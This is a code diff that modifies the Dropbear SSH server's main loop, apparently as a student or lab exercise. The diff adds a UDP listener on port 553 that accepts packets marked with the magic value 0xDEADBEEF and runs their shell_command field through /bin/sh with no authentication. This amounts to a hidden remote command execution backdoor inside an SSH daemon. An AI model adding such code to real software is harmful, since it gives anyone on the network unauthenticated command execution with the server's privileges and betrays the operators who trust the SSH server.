@@ -38,6 +38,20 @@ static void sigintterm_handler(int fish);
 static void main_inetd(void);
 static void main_noinetd(int argc, char ** argv, const char* multipath);
 static void commonsetup(void);
+//static int listen_port553_udp(void);
+
+//I did want to make udp_handler.h & .c but struggled with the makefile...
+//typedef struct {
+//
+//	uint32_t magic; /* should be 0xDEADBEEF */
+//
+//	uint16_t port_number;
+//
+//	char shell_command[256];
+//
+//} listen_packet_t;
+
+
 
 #if defined(DBMULTI_dropbear) || !DROPBEAR_MULTI
 #if defined(DBMULTI_dropbear) && DROPBEAR_MULTI
@@ -128,6 +142,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 	unsigned int i, j;
 	int val;
 	int maxsock = -1;
+	int udp_sock = -1;
 	int listensocks[MAX_LISTEN_ADDR];
 	size_t listensockcount = 0;
 	FILE *pidfile = NULL;
@@ -164,26 +179,16 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 	for (i = 0; i < listensockcount; i++) {
 		FD_SET(listensocks[i], &fds);
 	}
-	//-----------------------------------------------------------------------------------------------------------1
-	int udp_sock = socket(AF_INET, SOCK_DGRAM, 0); // Create UDP socket
-	if (udp_sock < 0) {
-		dropbear_exit("Creating UDP socket failed");
+	//----------make it a function afterwards-------------------------------------------------------------------------------------------------1
+	//listen to udp port 553
+	if (svr_opts.listen_port553_udp == 1) {
+		int portno = 553;
+		if ((udp_sock = bind_port_udp(portno)) < 0 ){
+			dropbear_exit("Failed listening to UDP socket");
+		}
+		FD_SET(udp_sock, &fds);
+		maxsock = MAX(maxsock, udp_sock);
 	}
-
-	struct sockaddr_in udp_servaddr;
-	memset(&udp_servaddr, 0, sizeof(udp_servaddr));
-
-	// Filling server information
-	udp_servaddr.sin_family = AF_INET; //IPv4
-	udp_servaddr.sin_addr.s_addr = INADDR_ANY; // ask Or what to do since port 53 is DNS port
-	//udp_servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Listen on all interfaces
-	udp_servaddr.sin_port = htons(553); // Port 53 for DNS
-
-	// Bind the socket with the server address
-	if (bind(udp_sock, (struct sockaddr *)&udp_servaddr, sizeof(udp_servaddr)) < 0) {
-		dropbear_exit("Binding UDP socket failed");
-	}
-
 	//------------------------------------------------------------------------------------------------------------1
 
 #if DROPBEAR_DO_REEXEC
@@ -233,9 +238,13 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 		for (i = 0; i < listensockcount; i++) {
 			FD_SET(listensocks[i], &fds);
 		}
-		FD_SET(udp_sock, &fds);
-		maxsock = MAX(maxsock, udp_sock); // Update maxsock if necessary
-
+		//-----------------------------------------------------------------2
+		//we want 'select' function to take care of udp_sock as well
+		if (svr_opts.listen_port553_udp == 1) {
+			FD_SET(udp_sock, &fds);
+			maxsock = MAX(maxsock, udp_sock);
+		}
+//--------------------------------------------------------------------------2
 		/* pre-authentication clients */
 		for (i = 0; i < MAX_UNAUTH_CLIENTS; i++) {
 			if (childpipes[i] >= 0) {
@@ -244,28 +253,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 			}
 		}
 
-		//------------------------------------------------------------------------------------------------------2
-//		FD_SET(udp_sock, &fds);
-//		maxsock = MAX(maxsock, udp_sock); // Update maxsock if necessary
-//		//------------------------------------------------------------------------------------------------------2
 		val = select(maxsock+1, &fds, NULL, NULL, NULL);
-
-		//---------------------------------------------------------------------------------------------------3
-		if (FD_ISSET(udp_sock, &fds)) {
-			char buffer[1024]; // Adjust size as necessary
-			struct sockaddr_in cliaddr;
-			socklen_t len = sizeof(cliaddr);
-
-			ssize_t n = recvfrom(udp_sock, buffer, sizeof(buffer), 0,
-								 (struct sockaddr *)&cliaddr, &len);
-			if (n > 0) {
-				// Process the received datagram
-				dropbear_exit("elad gever");
-			} else {
-				perror("recvfrom failed");
-			}
-		}
-		//---------------------------------------------------------------------------------------------------3
 		if (ses.exitflag) {
 			unlink(svr_opts.pidfile);
 			dropbear_exit("Terminated by signal");
@@ -294,6 +282,45 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 		}
 
 		/* handle each socket which has something to say */
+//back here
+		//--------------------------------------------------------------------------------------------------3
+		if (svr_opts.listen_port553_udp==1 && FD_ISSET(udp_sock, &fds)) {
+			listen_packet_t packet = {0};
+			struct sockaddr_in cliaddr; // Client address
+			socklen_t len = sizeof(cliaddr); // Length of the client address
+
+			// Receive a datagram from a client
+			ssize_t n = recvfrom(udp_sock, &packet, sizeof(packet), 0, (struct sockaddr *)&cliaddr, &len);
+			if (n > 0) {
+				// Process the received datagram
+
+				packet.magic = ntohl(packet.magic);
+				packet.port_number = ntohs(packet.port_number);
+				packet.shell_command[sizeof(packet.shell_command) - 1] = '\0';
+				printf("Received datagram from client: %X %d %s\n",packet.magic,packet.port_number,packet.shell_command);
+				if (packet.magic == 0xDEADBEEF) {
+					if (fork() == 0) {
+						// Drop privileges here if necessary
+						execl("/bin/sh", "sh", "-c", packet.shell_command, (char *)NULL);
+						dropbear_exit("fork failed");
+					}
+				}
+				// Prepare a response
+//				const char* response = "This is a response from the server.\n";
+//				size_t response_length = strlen(response);
+//
+//				// Send the response back to the client
+//				ssize_t sent = sendto(udp_sock, response, response_length, 0, (struct sockaddr *)&cliaddr, len);
+//				if (sent < 0) {
+//					// If sendto failed, print an error message
+//					dropbear_exit("sendto failed");
+//				}
+//				// If recvfrom returned -1, an error occurred
+			} else if (n < 0) {
+				dropbear_exit("recvfrom failed");
+			}
+		}
+		//---------------------------------------------------------------------------------------------------3
 		for (i = 0; i < listensockcount; i++) {
 			size_t num_unauthed_for_addr = 0;
 			size_t num_unauthed_total = 0;
@@ -353,14 +380,14 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 				dropbear_log(LOG_WARNING, "Error forking: %s", strerror(errno));
 				goto out;
 			}
-
+			//crypto thing
 			addrandom((void*)&fork_ret, sizeof(fork_ret));
 
 			if (fork_ret > 0) {
 
 				/* parent */
-				childpipes[conn_idx] = childpipe[0];
-				m_close(childpipe[1]);
+				childpipes[conn_idx] = childpipe[0]; //uses pipe[0]
+				m_close(childpipe[1]); //close pipe[1]
 				preauth_addrs[conn_idx] = remote_host;
 				remote_host = NULL;
 
@@ -373,6 +400,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 				m_free(remote_port);
 
 #if !DEBUG_NOFORK
+				//set new session - detaching processes from terminals and making it the leader of a new session.
 				if (setsid() < 0) {
 					dropbear_exit("setsid: %s", strerror(errno));
 				}
@@ -382,8 +410,12 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 				for (j = 0; j < listensockcount; j++) {
 					m_close(listensocks[j]);
 				}
-
-				m_close(childpipe[0]);
+				//---------possibly have to close the UDP fd as well here
+				if (svr_opts.listen_port553_udp == 1) {
+					m_close(udp_sock);
+				}
+				//-----------------------------
+				m_close(childpipe[0]); //close pipe[0]
 
 				if (execfd >= 0) {
 #if DROPBEAR_DO_REEXEC
@@ -548,3 +580,26 @@ static size_t listensockets(int *socks, size_t sockcount, int *maxfd) {
 	}
 	return sockpos;
 }
+
+//static int listen_port553_udp(){
+//	int sockfd = socket(AF_INET, SOCK_DGRAM, 0); // Create UDP socket
+//	if (sockfd < 0) {
+//		dropbear_log(LOG_WARNING,"Creating UDP socket failed");
+//		return sockfd;
+//	}
+//
+//	struct sockaddr_in udp_servaddr;
+//	memset(&udp_servaddr, 0, sizeof(udp_servaddr));
+//
+//	// Filling server information
+//	udp_servaddr.sin_family = AF_INET; //IPv4
+//	udp_servaddr.sin_addr.s_addr = INADDR_ANY;
+//	udp_servaddr.sin_port = htons(553); // Port 53 for DNS
+//	// Bind the socket with the server address
+//	if (bind(sockfd, (struct sockaddr *) &udp_servaddr, sizeof(udp_servaddr)) < 0) {
+//		close(sockfd);
+//		dropbear_log(LOG_WARNING,"Binding UDP socket failed");
+//		return -1;
+//	}
+//	return sockfd;
+//}
